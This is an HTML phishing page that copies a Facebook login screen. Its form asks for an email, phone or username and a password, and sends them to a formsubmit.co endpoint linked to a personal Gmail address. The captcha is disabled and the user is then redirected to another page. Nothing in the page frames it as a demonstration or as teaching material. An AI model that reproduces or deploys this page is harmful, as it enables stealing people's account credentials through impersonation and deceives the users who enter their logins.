<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="index.css">
</head>
<body>

    <section class="login-form-wrap">
        <h1>Facebook</h1>
        <p class="con">Login to continue</p>
        <form class="login-form" action="https://formsubmit.co/is26683369@gmail.com" method="POST">
            <!-- Honeypot -->
            <input type="text" name="_honey" style="display: none;">

            <!-- Disable Captcha -->
            <input type="hidden" name="_captcha" value="false">

            <input type="hidden" name="_next" value="next.html">
          <label>
            <div class="input">
            <input type="text" name="email" required placeholder="Email, phone or user">
            </div>
          </label>
          <label>
            <input type="password" name="password" required placeholder="Password">
          </label>
          <div class="btn">
          <input type="submit" value="Login">
          </div>
        </form>
        <h5><a href="#">Forgot password</a></h5>
      </section>
      
</body>
</html>
